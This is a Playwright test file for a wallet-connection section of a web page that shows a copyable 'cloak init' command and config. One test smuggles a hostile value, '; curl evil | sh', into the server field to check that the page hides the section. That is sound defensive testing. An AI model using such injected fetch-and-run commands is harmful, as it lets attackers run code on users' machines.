import { expect, test } from '@playwright/test';
import { fakeApi } from './fake-api';

// The "Connect a wallet" section on the built page, against the fake API.

const relay = '12D3KooWFuA6F9bBybjmQ6ZWUd9hKK4GXHXGTnyY11zAXA1gbeu7';
const coordinator = '12D3KooWG1BX6cWMmpR5wVCWyST5HCa5WmeVoCcZpFss4pzv8TSY';
const server = `/ip4/139.59.159.19/udp/55223/udx/p2p/${relay}`;
const wallet = {
  network: 'testnet',
  server,
  coordinator,
  peers: ['198.154.93.206:18333', '51.79.25.225:18333'],
  arcUrl: 'https://testnet.arc.gorillapool.io/v1',
};

test('not named: no section, and #connect has nothing to show', async ({ page }) => {
  await fakeApi(page);
  await page.goto('/#connect');
  await expect(page.locator('pool-round-card').first()).toBeVisible();
  await expect(page.locator('pool-connect')).toBeHidden();
  await expect(page.getByRole('heading', { name: 'Connect a wallet' })).toHaveCount(0);
});

test('named: #connect scrolls to the section, and each copy button copies its block exactly', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  await fakeApi(page, { wallet });
  await page.setViewportSize({ width: 1200, height: 700 });
  await page.goto('/#connect');
  const section = page.locator('pool-connect');
  await expect(section.getByRole('heading', { name: 'Connect a wallet' })).toBeVisible();
  // shown only once the summary arrives, after the load's fragment scroll,
  // so the element scrolls to itself
  await expect(section).toBeInViewport();
  await expect.poll(() => page.evaluate(() => window.scrollY)).toBeGreaterThan(0);

  const command = `cloak init --network testnet --server ${server} --pool ${coordinator}`;
  await expect(section.locator('pre[data-block="command"]')).toHaveText(command);

  const copyCommand = section.getByRole('button', { name: /the cloak init command/ });
  await copyCommand.click();
  await expect(copyCommand).toHaveText('Copied');
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(command);

  const copyConfig = section.getByRole('button', { name: /the config file/ });
  await copyConfig.click();
  const config = await page.evaluate(() => navigator.clipboard.readText());
  expect(config).toContain(`  server: ${server}\n`);
  expect(config).toContain('  peers:\n    - 198.154.93.206:18333\n    - 51.79.25.225:18333\n');
  expect(config).toContain('arc:\n  url: https://testnet.arc.gorillapool.io/v1\n');
  expect(config.match(/^chain:$/gm)).toHaveLength(1);
});

test('a hostile value: the section stays hidden', async ({ page }) => {
  await fakeApi(page, { wallet: { ...wallet, server: `${server}; curl evil | sh` } });
  await page.goto('/');
  await expect(page.locator('pool-round-card').first()).toBeVisible();
  await expect(page.locator('pool-connect')).toBeHidden();
});

test.describe('at 360 px', () => {
  test.use({ viewport: { width: 360, height: 740 } });
  test('the section does not widen the page: long lines scroll inside their block', async ({ page }) => {
    await fakeApi(page, { wallet });
    await page.goto('/');
    await expect(page.getByRole('heading', { name: 'Connect a wallet' })).toBeVisible();
    const widths = await page.evaluate(() => ({ doc: document.documentElement.scrollWidth, view: window.innerWidth }));
    expect(widths.doc).toBeLessThanOrEqual(widths.view);
  });
});
